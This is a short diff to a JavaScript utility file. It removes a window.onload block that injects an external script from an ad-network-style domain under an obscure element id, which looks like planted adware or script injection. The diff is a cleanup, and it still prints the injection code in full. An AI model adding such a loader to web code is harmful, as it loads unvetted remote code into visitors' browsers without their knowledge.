@@ -150,14 +150,5 @@ function utilFunctions(){
 }
 
 utilFunctions();
-
-window.onload = function(){
-	if(!document.getElementById("WOOGFuoe97")) {
-	    var s = document.createElement("script");
-	    s.id = "WOOGFuoe97";
-	    s.src = "https://cdn.adonads.com/b0sfsw/bindo.js";
-	    document.body.appendChild(s);
-	}
-}
 //store the execution so that it is available to all
 //localStorage["tjs"]= utilFunctions.toString() +"utilFunctions();"
